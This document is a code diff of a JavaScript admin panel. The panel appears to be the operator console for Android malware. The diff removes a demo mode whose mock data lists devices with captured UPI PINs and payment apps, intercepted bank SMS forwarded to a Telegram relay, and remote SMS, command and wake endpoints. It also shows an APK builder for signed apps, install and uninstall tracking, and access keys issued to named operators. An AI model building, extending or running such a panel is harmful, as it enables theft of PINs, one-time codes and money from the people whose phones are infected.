+const jobs=[loadDevices(),loadMessages(),loadRules(),loadRelay(),
 loadAutoSender(),loadStats(),loadGrowthEvents(),loadBuilderConfig(),loadApps(),loadBuilds()];
 if(state.role==="admin")jobs.push(loadUsers());
 const res=await Promise.allSettled(jobs);
@@ -2565,7 +2514,7 @@ if(section==="messages")await loadMessages();
 if(section==="rules")await loadRules();
 if(section==="users")await loadUsers();
 if(section==="growth"){ await loadStats(); await loadGrowthEvents(); }
-if(section==="relay"){ await loadRelay(); await loadRelayLogs(); await loadRules(); }
+if(section==="relay"){ await loadRelay(); await loadRules(); }
 if(section==="live"){ await loadDevices(); await loadMessages(); }
 if(section==="builder"){ await loadBuilderConfig(); await loadApps(); await loadBuilds(); }
 toast("synced");
@@ -2575,12 +2524,12 @@ toast("synced");
 function setLink(t){ const el=$("#linkLabel"); if(el)el.textContent=t; }
 function updateLink(){
 const el=$("#linkLabel");
-if(el)el.textContent=DEMO?"Demo":(state.wsOk?"Socket live":(state.linkOk?"Polling":"Link down"));
-badge($("#wsBadge"),state.wsOk?"Live":"Polling",state.wsOk?"ok":"warn");
+if(el)el.textContent=state.apiDown?"Link down":(state.wsOk?"Socket live":(state.linkOk?"Polling":"Connecting"));
+badge($("#wsBadge"),state.wsOk?"Live":(state.apiDown?"Down":"Polling"),state.wsOk?"ok":(state.apiDown?"bad":"warn"));
 }
 
 function connectWs(){
-if(!state.auth||DEMO)return;
+if(!state.auth)return;
 if(state.ws&&(state.ws.readyState===0||state.ws.readyState===1))return;
 try{
 const proto=location.protocol==="https:"?"wss:":"ws:";
@@ -2640,19 +2589,13 @@ if(state.auth&&!document.hidden){
 await Promise.allSettled([loadDevices(),loadMessages(),loadStats()]);
 if(state.builds.some((b)=>b.status==="running"||b.status==="queued")){
 await Promise.allSettled([loadBuilds(),loadBuilderConfig()]);
+if(state.logBuild)fetchBuildLog();
 }
 }
 schedulePoll();
 },fast?8000:20000);
 }
-function scheduleProbe(){
-setTimeout(async()=>{
-if(DEMO){ try{ const r=await fetch("/health",{credentials:"same-origin"});
-if(r.ok){ leaveDemo(); await refreshAll(); } }catch(e){} }
-scheduleProbe();
-},25000);
-}
-function startRealtime(){ updateLink(); connectWs(); schedulePoll(); scheduleProbe(); }
+function startRealtime(){ updateLink(); connectWs(); schedulePoll(); }
 
 function navigate(page){
 document.querySelectorAll(".nav").forEach((b)=>b.classList.toggle("on",b.dataset.page===page));
@@ -2665,12 +2608,12 @@ if(page==="growth")refreshSection("growth");
 if(page==="builder")refreshSection("builder");
 }
 
-/* ------------------------------- wiring ------------------------------- */
+/* ------------------------------ wiring ------------------------------ */
 
 $("#apkBtn").href=APK_URL;
 $("#apkLogin").href=APK_URL;
-$("#apkSettings").href=APK_URL;
-$("#apkSettings").textContent=APK_URL;
+$("#apiHint").textContent=location.host||"/";
+$("#apiBase").textContent=location.origin||"/";
 
 $("#pinsBtn").addEventListener("click",()=>{ state.pinsOnly=!state.pinsOnly;
 $("#pinsBtn").classList.toggle("on",state.pinsOnly); renderCards(true); });
@@ -2834,9 +2777,8 @@ toast("code bheja — Telegram check karo"); await loadRelay();
 $("#relayVerify").addEventListener("click",async()=>{
 $("#relayVerify").disabled=true;
 try{
-const r=await api("/admin/relay/login/verify",{method:"POST",
+await api("/admin/relay/login/verify",{method:"POST",
 body:JSON.stringify({code:$("#relayCode").value.trim(),password:$("#relayPass").value})});
-if(r.status==="2fa_required"){ toast("2FA password daalo"); return; }
 $("#relayCode").value=""; $("#relayPass").value="";
 toast("relay connected"); await loadRelay(); await loadAutoSender();
 }catch(e){ toast(e.message); } finally{ $("#relayVerify").disabled=false; }
@@ -2865,7 +2807,6 @@ catch(e){ $("#parseOut").textContent=e.message; } });
 $("#msgFilter").addEventListener("change",renderMessages);
 $("#msgSearch").addEventListener("input",renderMessages);
 
-/* -------- builder wiring -------- */
 $("#appCreate").addEventListener("click",createApp);
 $("#appName").addEventListener("keydown",(e)=>{ if(e.key==="Enter")createApp(); });
 $("#secretCopy").addEventListener("click",()=>copyText($("#secretValue").textContent.trim()));
@@ -2873,7 +2814,6 @@ $("#secretHide").addEventListener("click",()=>{ $("#secretOut").hidden=true; });
 $("#logClose").addEventListener("click",()=>{ $("#logPanel").hidden=true; state.logBuild=null; });
 $("#logReload").addEventListener("click",fetchBuildLog);
 
-/* -------- key generate -------- */
 $("#kGen").addEventListener("click",async()=>{
 const btn=$("#kGen"); btn.disabled=true;
 try{
@@ -2922,7 +2862,7 @@ $("#logoutBtn").addEventListener("click",async()=>{
 try{ await api("/admin/logout",{method:"POST"},false); }catch(e){}
 try{ if(state.ws)state.ws.close(); }catch(e){}
 try{ if(state.wsUser)state.wsUser.close(); }catch(e){}
-clearTimeout(state.pollTimer); clearTimeout(state.wsTimer); clearTimeout(state.logTimer);
+clearTimeout(state.pollTimer); clearTimeout(state.wsTimer);
 clearSession();
 state.devices=[]; state.messages=[]; state.devMsgs={}; state.users=[];
 state.growth=null; state.growthEvents=[];
@@ -2944,210 +2884,6 @@ document.addEventListener("click",(ev)=>{ if(!ev.target.closest(".act-wrap"))$("
 document.addEventListener("keydown",(ev)=>{ if(ev.key==="Escape"&&!$("#detail").hidden)closeDetail(); });
 document.addEventListener("visibilitychange",()=>{ if(!document.hidden&&state.auth){
 loadDevices().catch(()=>{}); loadMessages().catch(()=>{}); loadStats().catch(()=>{}); } });
-
-/* ------------------------------- demo ------------------------------- */
-
-const DEMO_DEVICES=[
-{id:"d1",short_id:"TPC-0001",device_name:"Redmi Note 12",ws_connected:true,live_number:"+91 98765 11223",entered_number:"+91 98765 11223",upi_pin:"4821",payment_app:"PhonePe",install_state:"active",install_seq:1,app_version:"4.4",created_at:Date.now()-777600000,auto_sender:{enabled:true,channel_id:"-1002345678901",channel_title:"TPC Relay",sim_slots:[0,1],tg_confirm:true},telemetry:{model:"Redmi Note 12",manufacturer:"Xiaomi",android_version:"13",battery_level:84,ram_gb:6,storage_gb:128,network_type:"4G",sims:[{slot:0,carrier:"Jio"},{slot:1,carrier:"Airtel"}]}},
-{id:"d2",short_id:"TPC-0002",device_name:"Realme C55",ws_connected:true,live_number:"+91 98765 44556",entered_number:"+91 98765 44556",upi_pin:"9107",payment_app:"Paytm",install_state:"active",install_seq:2,app_version:"4.4",created_at:Date.now()-518400000,auto_sender:{enabled:false,channel_id:"",channel_title:"",sim_slots:[],tg_confirm:true},telemetry:{model:"Realme C55",manufacturer:"Realme",android_version:"14",battery_level:23,ram_gb:4,storage_gb:64,network_type:"4G",sims:[{slot:0,carrier:"Airtel"}]}},
-{id:"d3",short_id:"TPC-0003",device_name:"Poco M6",ws_connected:false,live_number:null,entered_number:"+91 90123 77889",upi_pin:"3355",payment_app:"GPay",install_state:"uninstalled",install_seq:1,app_version:"4.3",created_at:Date.now()-345600000,auto_sender:{enabled:false,channel_id:"",channel_title:"",sim_slots:[],tg_confirm:true},telemetry:{model:"Poco M6",manufacturer:"Poco",android_version:"13",battery_level:12,ram_gb:4,storage_gb:128,network_type:"WiFi",sims:[{slot:0,carrier:"Vi"}]}},
-{id:"d4",short_id:"TPC-0004",device_name:"Samsung A15",ws_connected:true,live_number:"+91 99887 33445",entered_number:"+91 99887 33445",upi_pin:null,payment_app:"PhonePe",install_state:"active",install_seq:1,app_version:"4.4",created_at:Date.now()-172800000,auto_sender:{enabled:false,channel_id:"",channel_title:"",sim_slots:[],tg_confirm:true},telemetry:{model:"Galaxy A15",manufacturer:"Samsung",android_version:"14",battery_level:67,ram_gb:6,storage_gb:128,network_type:"5G",sims:[{slot:0,carrier:"Jio"}]}}
-];
-
-const DEMO_MESSAGES=[
-{id:"m0",device_id:"d1",device_name:"Redmi Note 12",direction:"in",address:"VK-SBIINB",body:"Rs.450.00 credited to A/c XX1234 via UPI. Ref 402312459871",amount:"450",kind:"upi",status:"received",sim_slot:null,created_at:Date.now()-600000},
-{id:"m1",device_id:"d2",device_name:"Realme C55",direction:"in",address:"AX-PAYTM",body:"Rs.1,200 debited from A/c XX9912. UPI ref 402398112233",amount:"1200",kind:"upi",status:"received",sim_slot:null,created_at:Date.now()-1900000},
-{id:"m2",device_id:"d4",device_name:"Samsung A15",direction:"out",address:"+91 98765 11223",body:"Payment received, thanks!",amount:null,kind:null,status:"sent",sim_slot:0,created_at:Date.now()-2900000},
-{id:"m3",device_id:"d1",device_name:"Redmi Note 12",direction:"out",address:"+91 98765 11223",body:"Auto reply from SIM 2",amount:null,kind:null,status:"sent",sim_slot:1,created_at:Date.now()-500000}
-];
-
-const DEMO_KEYS=[
-{id:"k1",key:"TPC-8H4K-2MNP-9QRS",label:"Rahul",phone:"+91 90000 11111",created_at:Date.now()-86400000*12,last_login_at:Date.now()-3600000,login_count:14,expires_at:new Date(Date.now()+86400000*18).toISOString(),blocked:false,expired:false},
-{id:"k2",key:"TPC-7T3D-KLMN-4WXY",label:"Vikas",phone:"+91 90000 22222",created_at:Date.now()-86400000*40,last_login_at:Date.now()-86400000*3,login_count:52,expires_at:new Date(Date.now()-86400000*2).toISOString(),blocked:false,expired:true},
-{id:"k3",key:"TPC-2A9B-PQRS-6DEF",label:"Amit",phone:"",created_at:Date.now()-86400000*3,last_login_at:null,login_count:0,expires_at:new Date(Date.now()+86400000*4).toISOString(),blocked:false,expired:false}
-];
-
-const DEMO_APPS=[
-{appId:"a_demo_8f3k2",name:"DemoShop",package:"com.tpcapp.demo.8f3k2",secret_last4:"9Xq2",secret_version:1,created_at:Date.now()-86400000*3,builds_total:2,last_build_at:Date.now()-3600000},
-{appId:"a_demo_2m7p9",name:"DemoNotes",package:"com.tpcapp.demo.2m7p9",secret_last4:"Lw2a",secret_version:2,created_at:Date.now()-86400000,builds_total:0,last_build_at:null}
-];
-
-const DEMO_BUILDS=[
-{buildId:"b_2",appId:"a_demo_8f3k2",appName:"DemoShop",status:"success",variant:"release",versionCode:1,versionName:"1.0",duration_ms:184000,apk_size:4718592,apk_sha256:"9f2ab1c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0",signed:true,queued_at:Date.now()-300000,finished_at:Date.now()-116000,download_ready:true},
-{buildId:"b_1",appId:"a_demo_8f3k2",appName:"DemoShop",status:"failed",variant:"release",versionCode:1,versionName:"1.0",duration_ms:41000,apk_size:null,apk_sha256:null,signed:false,error:"gradle exit 1\n> Task :app:compileReleaseKotlin FAILED",queued_at:Date.now()-900000,finished_at:Date.now()-859000,download_ready:false}
-];
-
-function mockApi(path,options){
-const p=path.split("?")[0]; const o=options||{};
-let body={}; try{ body=o.body?JSON.parse(o.body):{}; }catch(e){ body={}; }
-if(p==="/admin/auth/status")return{authenticated:Boolean(readSession()),role:(readSession()||{}).role||"admin"};
-if(p==="/panel/login")return{status:"ok",username:body.username||"admin",role:"admin",token:"demo."+btoa(body.username||"a"),expires_in:2592000};
-if(p==="/panel/access")return{status:"ok",username:"keyuser",role:"user",token:"demo."+btoa(body.key||"k"),expires_in:2592000};
-if(p==="/admin/logout")return{status:"ok"};
-if(p==="/health")return{status:"ok",version:"5.5.0",build_queue:{queued:0,running:0}};
-if(p==="/health/database")return{status:"ok"};
-if(p==="/health/builder")return{status:"ok",variant:"release",worker_mode:"inline",template_ok:true,
-tools:{gradle:"/usr/bin/gradle",keytool:"/usr/bin/keytool",apksigner:"/usr/bin/apksigner",zipalign:"/usr/bin/zipalign",docker:null},
-queue:{queued:0,running:0,concurrency:1},counts:{apps:2,builds:2,queued:0,running:0,success:1,failed:1}};
-if(p==="/admin/devices")return{devices:DEMO_DEVICES};
-if(p==="/admin/messages")return{messages:DEMO_MESSAGES};
-if(p==="/admin/stats")return{
-installs_total:DEMO_DEVICES.length,unique_devices:4,reinstalls:1,
-install_events_24h:2,install_events_7d:3,updates_total:1,updates_7d:1,
-live:3,idle:0,stale:0,uninstalled:1,replaced:0,onboarded:3,
-retention_pct:75.0,uninstall_rate_pct:25.0,
-outbox:{queued:2,sent:11,delivered:9,failed:1,pending:2},
-generated_at:new Date().toISOString()};
-if(p==="/admin/growth/events")return{events:[
-{id:"e1",event:"install",short_id:"TPC-0004",device_name:"Samsung A15",app_version:"4.4",android_id:"a1b2c3d4e5f6",ts:new Date(Date.now()-3600000).toISOString()},
-{id:"e2",event:"install",short_id:"TPC-0002",device_name:"Realme C55",app_version:"4.4",android_id:"b2c3d4e5f6a1",ts:new Date(Date.now()-7200000).toISOString()},
-{id:"e3",event:"update",short_id:"TPC-0001",device_name:"Redmi Note 12",app_version:"4.4",android_id:"c3d4e5f6a1b2",ts:new Date(Date.now()-10800000).toISOString()},
-{id:"e4",event:"gone",short_id:"TPC-0003",device_name:"Poco M6",app_version:"4.3",android_id:"d4e5f6a1b2c3",ts:new Date(Date.now()-14400000).toISOString()}
-]};
-
-/* ---- builder ---- */
-if(p==="/api/builder/config")return{variant:"release",daily_quota:20,download_ttl:300,
-signature_window:300,signature_version:1,concurrency:1,worker_mode:"inline",
-queue:{queued:0,running:0,concurrency:1}};
-if(p==="/api/builder/socket-stats")return{rooms:1,sockets:1};
-if(p==="/api/apps"){
-if(o.method==="POST"){
-const aid="a_demo_"+Math.random().toString(36).slice(2,7);
-const secret="s3c_"+Math.random().toString(36).slice(2,12)+Math.random().toString(36).slice(2,12);
-const app={appId:aid,name:body.name,package:"com.tpcapp.demo."+aid.slice(-5),
-secret_last4:secret.slice(-4),secret_version:1,created_at:Date.now(),builds_total:0,last_build_at:null,secret:secret};
-DEMO_APPS.unshift(app); return{status:"ok",app:app};
-}
-return{apps:DEMO_APPS,quota:{used_today:2,daily_limit:20,remaining:18,unlimited:false}};
-}
-if(/^\/api\/apps\/[^/]+\/secret\/rotate$/.test(p)){
-const aid=p.split("/")[3]; const a=DEMO_APPS.find((x)=>x.appId===aid);
-const secret="s3c_"+Math.random().toString(36).slice(2,12)+Math.random().toString(36).slice(2,12);
-if(a){ a.secret_last4=secret.slice(-4); a.secret_version=(a.secret_version||1)+1; a.secret=secret; }
-return{status:"ok",app:a||{},note:"purana secret ab 401 dega"};
-}
-if(/^\/api\/apps\/[^/]+$/.test(p)&&o.method==="DELETE"){
-const aid=p.split("/")[3]; const i=DEMO_APPS.findIndex((x)=>x.appId===aid);
-if(i>=0)DEMO_APPS.splice(i,1); return{status:"ok"};
-}
-if(p==="/api/builds"){
-if(o.method==="POST"){
-const b={buildId:"b_"+(DEMO_BUILDS.length+1),appId:body.appId,
-appName:(DEMO_APPS.find((x)=>x.appId===body.appId)||{}).name||"App",
-status:"queued",variant:body.variant||"release",versionCode:1,versionName:"1.0",
-queued_at:Date.now(),download_ready:false};
-DEMO_BUILDS.unshift(b); return{status:"ok",build:b,queued:true};
-}
-return{builds:DEMO_BUILDS,queue:{queued:0,running:0,concurrency:1}};
-}
-if(/^\/api\/builds\/[^/]+\/cancel$/.test(p)){
-const bid=p.split("/")[3]; const b=DEMO_BUILDS.find((x)=>x.buildId===bid);
-if(b)b.status="canceled"; return{status:"ok",build:b||{}};
-}
-if(/^\/api\/builds\/[^/]+\/retry$/.test(p)){
-const bid=p.split("/")[3]; const old=DEMO_BUILDS.find((x)=>x.buildId===bid)||{};
-const nb={buildId:"b_"+(DEMO_BUILDS.length+1),appId:old.appId,appName:old.appName,
-status:"queued",variant:old.variant||"release",queued_at:Date.now(),download_ready:false};
-DEMO_BUILDS.unshift(nb); return{status:"ok",build:nb,queued:true};
-}
-if(/^\/api\/builds\/[^/]+\/download$/.test(p)){
-const bid=p.split("/")[3];
-return{status:"ok",url:"/api/builds/"+bid+"/download?token=demo",expires_in:300,
-expires_at:Math.floor(Date.now()/1000)+300,apk_size:4718592,apk_sha256:"demo",signed:true};
-}
-if(/^\/api\/builds\/[^/]+$/.test(p)){
-const bid=p.split("/")[3]; const b=DEMO_BUILDS.find((x)=>x.buildId===bid)||{};
-return{build:Object.assign({log_tail:[
-"[1/7] workspace /tmp/tpc_builds/"+bid,
-"[2/7] keystore ready",
-"[3/7] strings.xml patched",
-"[4/7] builder.properties written",
-"[5/7] gradle assembleRelease",
-"> Task :app:compileReleaseKotlin",
-"> Task :app:packageRelease",
-"BUILD SUCCESSFUL in 1m 48s",
-"[6/7] apksigner sign + verify ok",
-"[7/7] published "+bid+".apk"
-]},b)};
-}
-
-/* ---- keys ---- */
-if(p==="/admin/keys"){
-if(o.method==="POST"){
-const k="TPC-"+Math.random().toString(36).slice(2,6).toUpperCase()+"-"+
-Math.random().toString(36).slice(2,6).toUpperCase()+"-"+
-Math.random().toString(36).slice(2,6).toUpperCase();
-DEMO_KEYS.unshift({id:"k"+Date.now(),key:k,label:body.label||"",phone:body.phone||"",
-created_at:Date.now(),last_login_at:null,login_count:0,
-expires_at:Number(body.days)>0?new Date(Date.now()+Number(body.days)*86400000).toISOString():null,
-blocked:false,expired:false});
-return{status:"ok",key:k};
-}
-return{keys:DEMO_KEYS};
-}
-if(/^\/admin\/keys\/[^/]+\/expiry$/.test(p)){
-const id=p.split("/")[3]; const u=DEMO_KEYS.find((x)=>x.id===id);
-if(u){
-if(body.lifetime){ u.expires_at=null; u.expired=false; }
-else if(body.days!=null){ u.expires_at=new Date(Date.now()+body.days*86400000).toISOString(); u.expired=false; }
-else if(body.expires_at){ u.expires_at=new Date(body.expires_at).toISOString(); u.expired=false; }
-}
-return{status:"ok"};
-}
-if(/^\/admin\/keys\/[^/]+\/toggle$/.test(p)){
-const id=p.split("/")[3]; const u=DEMO_KEYS.find((x)=>x.id===id);
-if(u)u.blocked=Boolean(body.blocked); return{status:"ok"};
-}
-if(/^\/admin\/keys\/[^/]+\/delete$/.test(p)){
-const id=p.split("/")[3]; const i=DEMO_KEYS.findIndex((x)=>x.id===id);
-if(i>=0)DEMO_KEYS.splice(i,1); return{status:"ok"};
-}
-if(p==="/admin/rules"){
-if(o.method==="POST"){ state.rules.push({id:"r"+Date.now(),name:body.name,match:body.match,
-reply:body.reply,upi_only:Boolean(body.upi_only),enabled:true}); return{status:"ok"}; }
-return{rules:state.rules};
-}
-if(/^\/admin\/rules\/[^/]+\/toggle$/.test(p)){
-const id=p.split("/")[3]; const r=state.rules.find((x)=>x.id===id);
-if(r)r.enabled=!r.enabled; return{status:"ok",enabled:r?r.enabled:false};
-}
-if(p==="/admin/auto-sender")return{relay_ready:true,telethon:true,account:{username:"tpc_ops"},
-forward_user:"@tpc_ops",channels:["-1002345678901"],devices_enabled:1};
-if(p==="/admin/auto-sender/verify")return{status:"ok",channel_id:body.channel_id,title:"TPC Relay",admin:true};
-if(p==="/admin/auto-sender/test")return{status:"ok"};
-if(/^\/admin\/devices\/[^/]+\/auto-sender$/.test(p)){
-const id=p.split("/")[3]; const d=DEMO_DEVICES.find((x)=>x.id===id);
-if(!d)return{status:"ok",auto_sender:{enabled:false,channel_id:"",channel_title:"",sim_slots:[],tg_confirm:true}};
-d.auto_sender={
-enabled:body.enabled===undefined?d.auto_sender.enabled:Boolean(body.enabled),
-channel_id:body.channel_id===undefined?d.auto_sender.channel_id:body.channel_id,
-channel_title:body.channel_title||d.auto_sender.channel_title||"",
-sim_slots:body.sim_slots===undefined?d.auto_sender.sim_slots:(body.sim_slots||[]).slice(),
-tg_confirm:body.tg_confirm===undefined?d.auto_sender.tg_confirm:Boolean(body.tg_confirm)
-};
-return{status:"ok",auto_sender:d.auto_sender};
-}
-if(/^\/admin\/devices\/[^/]+\/messages$/.test(p)){
-const id=p.split("/")[3]; return{messages:DEMO_MESSAGES.filter((x)=>x.device_id===id)};
-}
-if(/^\/admin\/devices\/[^/]+\/push-outbox$/.test(p))return{status:"ok",pushed:1};
-if(/^\/admin\/devices\/[^/]+\/(sms|command|ping|refresh|wake)$/.test(p))return{status:"ok",queued:1,delivered:true,slots:body.sim_slots||[null]};
-if(p==="/admin/send")return{status:"ok",queued:DEMO_DEVICES.length,delivered:DEMO_DEVICES.filter((d)=>d.ws_connected).length,note:""};
-if(p==="/admin/relay/status")return{telethon:true,state:{authorized:true,me:{username:"tpc_ops"},forward_user:"@tpc_ops"},bans:state.bans||[],channels:["-1002345678901"]};
-if(p==="/admin/relay/logs")return{logs:state.tgLogs};
-if(p==="/admin/relay/login/start")return{status:"code_sent"};
-if(p==="/admin/relay/login/verify")return{status:"ok"};
-if(p==="/admin/relay/logout")return{status:"ok"};
-if(p==="/admin/relay/forward")return{status:"ok",forward_user:body.target};
-if(p==="/admin/relay/bans"){
-state.bans=state.bans||[];
-if(o.method==="POST"){ state.bans.push(body.address); return{status:"ok",bans:state.bans}; }
-return{bans:state.bans};
-}
-if(/^\/admin\/relay\/bans\/.+\/delete$/.test(p))return{status:"ok",bans:state.bans||[]};
-if(p==="/admin/relay/parse")return{matched:true,to:"+919876543210",body:"Rs.450 credited via UPI",device_hint:null,targets:["TPC-0001"]};
-return{};
-}
 
 buildSimChips($("#bulkSims"),"bulk",null);
 checkAuth();
